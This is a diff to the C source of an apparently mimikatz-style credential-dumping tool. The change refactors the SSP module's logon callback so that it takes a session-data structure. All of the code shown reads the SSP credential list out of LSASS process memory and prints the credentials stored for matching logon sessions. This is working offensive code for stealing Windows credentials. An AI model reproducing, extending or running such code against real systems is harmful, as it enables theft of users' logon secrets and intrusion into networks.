@@ -36,14 +36,14 @@ LONG kuhl_m_sekurlsa_ssp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state)
 	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_ssp_single_package, 1, callback, state);
 }
 
-void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PLUID logId, IN PVOID pCredentials, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
+void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
 {
 	KIWI_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
 	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &hBuffer}, aLsass = {NULL, cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &hBuffer}, aLsass = {NULL, pData->cLsass->hLsassMem};
 	ULONG monNb = 0;
 
-	if(kuhl_m_sekurlsa_ssp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(cLsass, &kuhl_m_sekurlsa_ssp_package.Module, SspReferences, sizeof(SspReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &SspCredentialList, NULL, NULL))
+	if(kuhl_m_sekurlsa_ssp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_ssp_package.Module, SspReferences, sizeof(SspReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &SspCredentialList, NULL, NULL))
 	{
 		aLsass.address = SspCredentialList;
 		if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(LIST_ENTRY)))
@@ -53,10 +53,10 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKUHL_M_SEKURLSA_CONTEX
 			{
 				if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY)))
 				{
-					if(RtlEqualLuid(logId, &mesCredentials.LogonId))
+					if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId))
 					{
 						kprintf(L"\n\t [%08x]", monNb++);
-						kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, logId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN, externalCallback, externalCallbackData);
+						kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN, externalCallback, externalCallbackData);
 					}
 					aLsass.address = mesCredentials.Flink;
 				}
